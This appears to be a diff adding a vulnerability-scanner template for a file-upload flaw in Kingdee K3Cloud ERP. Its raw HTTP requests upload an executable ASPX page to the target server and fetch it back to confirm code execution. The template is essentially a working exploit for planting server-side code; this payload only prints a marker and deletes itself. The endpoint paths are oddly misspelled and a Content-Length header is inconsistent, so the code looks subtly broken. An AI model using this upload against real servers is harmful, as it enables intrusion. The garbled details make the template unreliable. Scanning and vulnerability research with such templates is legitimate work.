@@ -1,0 +1,54 @@
+id: kingdee-erp-MOBFileUpload-fileupload
+info:
+  name: demo
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/59063/
+  classification:
+    cve-id: 
+  metadata:
+    verified: false
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: fileupload,kingdee,k3cloud
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /k3cloud/FIleUplloadServices/MOBFileUpload.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Length: 1
+
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.aspx"
+        Content-Type: text/plain
+
+        <%@ Page Language="C#" %>
+        <%
+        Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));
+        System.IO.File.Delete(Request.PhysicalPath);
+        %>
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+      - |+
+        GET /k3cloud/FileeUploadServices/uplloadfiles/{{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'e165421110ba03099a1c0393373c5b43')
+        condition: and
